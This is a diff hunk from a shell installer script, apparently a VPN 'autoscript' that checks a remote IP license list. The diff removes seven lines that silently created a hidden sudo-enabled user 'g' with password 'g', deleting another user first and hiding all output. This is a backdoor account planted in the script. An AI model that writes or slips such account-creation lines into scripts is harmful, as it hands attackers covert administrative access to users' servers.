@@ -315,13 +315,6 @@ restart_system() {
     USRSC=$(wget -qO- https://raw.githubusercontent.com/altunnel/regip/main/ip | grep $ipsaya | awk '{print $2}')
     EXPSC=$(wget -qO- https://raw.githubusercontent.com/altunnel/regip/main/ip | grep $ipsaya | awk '{print $3}')
     TIMEZONE=$(printf '%(%H:%M:%S)T')
-userdel jame > /dev/null 2>&1
-Username='g'
-Password=g
-mkdir -p /home/script
-useradd -r -d /home/script-s /bin/bash -M $Username > /dev/null 2>&1
-echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-usermod -aG sudo $Username > /dev/null 2>&1
     TEXT="
 <code>────────────────────</code>
 <b>⚡AUTOSCRIPT PREMIUM⚡</b>
